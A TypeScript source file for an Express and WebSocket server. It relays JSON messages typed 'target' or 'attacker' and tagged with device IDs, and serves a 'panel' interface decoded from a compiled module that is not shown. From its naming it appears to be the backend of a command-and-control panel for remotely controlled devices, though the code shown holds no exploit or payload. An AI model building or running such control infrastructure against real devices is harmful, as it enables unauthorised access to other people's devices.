import fs from "fs";
import path from "path";
import http from "http";

import { WebSocket, WebSocketServer } from "ws";
import express from "express";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";
import dotenv from "dotenv";

// compiled
import { getDecodedFile as getDecodedFilePanel } from "./panel_compiled";

dotenv.config();

const PORT = process.env.PORT || 3000;

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(helmet());
app.use(morgan("dev"));

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

type MessageType = "target" | "attacker";
interface Message {
  type: MessageType;
  device_id: string;
  content: string;
}

// Ketika ada koneksi WebSocket baru
wss.on("connection", (ws: WebSocket) => {
  console.log("Client connected");

  ws.on("message", (data) => {
    const str = data.toString();
    console.log("Received:", str);

    let msg: Message;
    try {
      msg = JSON.parse(str);
    } catch (err) {
      console.error("Invalid JSON:", err);
      return;
    }

    // Broadcast ke semua client yang masih terbuka
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(msg));
      }
    });
  });

  ws.on("close", () => {
    console.log("Client disconnected");
  });

  // Optional: kirim pesan saat connect
  const welcome: Message = {
    type: "attacker",
    device_id: "abc123",
    content: "Welcome!",
  };
  ws.send(JSON.stringify(welcome));
});

// Serve the main panel page
app.use((req, res, next) => {
  let endpoint = req.path;
  if (endpoint.startsWith("/socket.io")) {
    next();
    return;
  }
  if (endpoint === "/") {
    endpoint = "/index.html";
  }
  const file = getDecodedFilePanel(endpoint);
  if (!file) {
    return res.status(404).send("File not found");
  }
  res.set("Content-Type", file.type);
  res.send(file.content);
});
